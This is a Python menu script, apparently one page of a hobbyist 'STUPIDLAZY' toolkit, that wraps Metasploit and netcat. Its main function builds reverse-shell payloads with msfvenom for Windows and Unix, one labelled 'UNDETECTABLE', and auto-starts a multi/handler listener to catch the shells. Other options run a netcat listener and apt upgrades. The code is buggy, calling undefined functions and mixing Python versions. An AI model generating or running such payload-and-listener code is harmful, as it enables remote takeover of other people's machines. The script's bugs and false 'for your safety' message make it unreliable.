#!/bin/usr/python
# -*- coding: utf-8 -*-

import os
import sys
import time
import colorama
from colorama import Fore, Back, init
import socket
import requests

def optiona1():
	os.system("clear")
	print("PLEASE WAIT...")
	os.system("msfconsole")

def optiona22():
	try:
		upgq = raw_input("Do you want to upgrade the packeges? yes/no :")
		if upgq	== "yes":
			os.system("xterm -e sudo apt-get upgrade")
			os.system("clear")
			print("ALL PACKEGES UPDATED, GOING BACK TO THE MAIN MENU")
			time.sleep(2)
			os.system("python page2.py")
		elif upgq == "no":
			os.system("python page2.py")            
		else:
			print("Error, this options ins't valid")
	except KeyboardInterrupt:
		print("Are you sure you want to stop? its really dangerous to stop while updating")
		print("For your safety the process will continue")
		option22()



def optiona2():
	try:
		os.system("clear")
		print("CHECKING FOR UPDATES, PLEASE WAIT")
		os.system("apt-get update")
		os.system("clear")
		print("PACKEGES THAT CAN BE UPGRADED! ")
		upg = os.system("apt list --upgradable")
		optiona22()
	except KeyboardInterrupt:
		print("Are you sure you want to stop? its really dangerous to stop while updating")
		print("For your safety the process will continue")
		time.sleep(2)
		option2()


def optiona3():
	try:
		ncl = input("What port you want to listen? : ")
		os.system("clear")
		os.system('sudo gnome-terminal -x bash -c "echo TYPE ANYTHING HERE TO TEST CONNECTIVITY && nc %s %s" 2> /dev/null | nc -l -p %s'%(host, ncl, ncl))
		os.system("python page2.py")
	except KeyboardInterrupt:
		print("\nListener stoped...")



def optiona4():
	try:
		os.system("clear")
		os.system("figlet PAYLOAD MAKER")
		print("1 -- windows/meterpreter/reverse_tcp (PAYLOAD REVERSE SHELL .EXE)")
		print("2 -- cmd/unix/reverse_python (PAYLOAD REVERSE SHELL .PY)")
		print("3 -- cmd/unix/reverse_bash (PAYLOAD REVERSE SHELL .SH)")
		print("4 -- windows/powershell_reverse_tcp (UNDETECTABLE PAYLOAD REVERSE SHELL .EXE)")
		choosemsf = input("Choose one option: ")
		hostmsf = raw_input("Select the local host (%s) : "%address)
		s.close()
		chooseportmsf = input("Select one listen port: ")
		namemsf = raw_input("Select the name of your payload : ")
		listenst = raw_input("Do you want to automatic start listen after the payload is done? yes/no: ")
		
		if choosemsf == 1:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(hostmsf, chooseportmsf, namemsf))
			print("DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
			if listenst == "yes":
				print("Starting msfconsole on listen mode")
				os.system("touch meterpreter.rc")
				os.system("echo use exploit/multi/handler >> meterpreter.rc")
				os.system("echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter.rc")
				os.system("echo set LHOST %s >> meterpreter.rc"%hostmsf)
				os.system("echo set LPORT %s >> meterpreter.rc"%chooseportmsf)
				os.system("echo exploit >> meterpreter.rc")
				os.system('sudo gnome-terminal -x bash -c "msfconsole -r meterpreter.rc" 2> /dev/null')
				os.system("rm -rf meterpreter.rc")
				os.system("python page2.py")
			if listenst == "no":
				return
		if choosemsf == 2:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw > %s.py"%(hostmsf, chooseportmsf, namemsf))
			print("DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
			if listenst == "yes":
				print("Starting msfconsole on listen mode")
				os.system("touch meterpreter.rc")
				os.system("echo use exploit/multi/handler >> meterpreter.rc")
				os.system("echo set PAYLOAD cmd/unix/reverse_python >> meterpreter.rc")
				os.system("echo set LHOST %s >> meterpreter.rc"%hostmsf)
				os.system("echo set LPORT %s >> meterpreter.rc"%chooseportmsf)
				os.system("echo exploit >> meterpreter.rc")
				os.system('sudo gnome-terminal -x bash -c "msfconsole -r meterpreter.rc"')
				os.system("rm -rf meterpreter.rc")
				os.system("python page2.py")
			if listenst == "no":
				return
		if choosemsf == 3:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw > %s.sh"%(hostmsf, chooseportmsf, namemsf))
			print("DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
			if listenst == "yes":
				print("Starting msfconsole on listen mode")
				os.system("touch meterpreter.rc")
				os.system("echo use exploit/multi/handler >> meterpreter.rc")
				os.system("echo set PAYLOAD cmd/unix/reverse_bash >> meterpreter.rc")
				os.system("echo set LHOST %s >> meterpreter.rc"%hostmsf)
				os.system("echo set LPORT %s >> meterpreter.rc"%chooseportmsf)
				os.system("echo exploit >> meterpreter.rc")
				os.system('sudo gnome-terminal -x bash -c "msfconsole -r meterpreter.rc"')
				os.system("rm -rf meterpreter.rc")
				os.system("python page2.py")
			if listenst == "no":
				return
		if choosemsf == 4:
			os.system("clear")
			print("Making your payload... Please wait")
			os.system("msfvenom -p windows/powershell_reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(hostmsf, chooseportmsf, namemsf))
			print("DONE !, THE PAYLOAD ITS LOCATED AT STUPIDLAZY FOLDER")
			if listenst == "yes":
				print("Starting msfconsole on listen mode")
				os.system("touch meterpreter.rc")
				os.system("echo use exploit/multi/handler >> meterpreter.rc")
				os.system("echo set PAYLOAD windows/powershell_reverse_tcp >> meterpreter.rc")
				os.system("echo set LHOST %s >> meterpreter.rc"%hostmsf)
				os.system("echo set LPORT %s >> meterpreter.rc"%chooseportmsf)
				os.system("echo exploit >> meterpreter.rc")
				os.system('sudo gnome-terminal -x bash -c "msfconsole -r meterpreter.rc"')
				os.system("rm -rf meterpreter.rc")
				os.system("python page2.py")
			if listenst == "no":
				return
	except KeyboardInterrupt:
		print("\nAborting...")
		time.sleep(2)
		os.system("python page2.py")


def optiona5():
	try:
		os.system("clear")
		print("Your public ip is %s"%ipub)
		menua()
	except KeyboardInterrupt:
		print("\nStopped")
		time.sleep(2)
		os.system("python page2.py")


def menua():
	try:
		wmenu = raw_input(RED + "You want to go back to the main menu? yes/no : " + RESET)
		if (wmenu == "yes"):
			os.system("python page2.py")
		elif (wmenu == "no"):
			os.system("clear")
			os.system("figlet Bye!")
			sys.exit()
		else:
			print("You have to answer with yes or no ! ")
			menua()
	except KeyboardInterrupt:
		os.system("clear")
		os.system("figlet Bye!")
		sys.exit()

host = socket.gethostname()
ip = socket.gethostbyname(host)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('8.8.8.8', 1))
address = s.getsockname()[0]
f = requests.request('GET', 'http://myip.dnsomatic.com')
ipub = f.text
RED = '\033[31m'
RESET = '\033[0m'
colorama.init(autoreset=True)

try:
	os.system("clear")
	os.system("figlet PAGE2")
	print("")
	print("a1 -- START MSFCONSOLE			    a2 -- AUTOMATIC UPDATE YOU MACHINE")
	print("a3 -- TEST CONNECTIVITY WITH NETCAT  	    a4 -- MAKE A PAYLOAD")
	print("a5 -- VIEW PUBLIC IP ADDRESS		    a100 -- GO BACK TO STUPIDLAZY")
	print("")
	choose = raw_input("Select one option : ")

	if choose == "a1":
		optiona1()
		os.system("python page2.py")

	elif choose == "a2":
		optiona2()
		
	elif choose == "a3":
		optiona3()

	elif choose == "a4":
		optiona4()

	elif choose == "a5":
		optiona5()

	elif choose == "a100":
		os.system("python stupidlazy.py")
	else:
		print(RED + "This option does not exists !" + RESET)
		menua()

except KeyboardInterrupt:
	os.system("python stupidlazy.py")
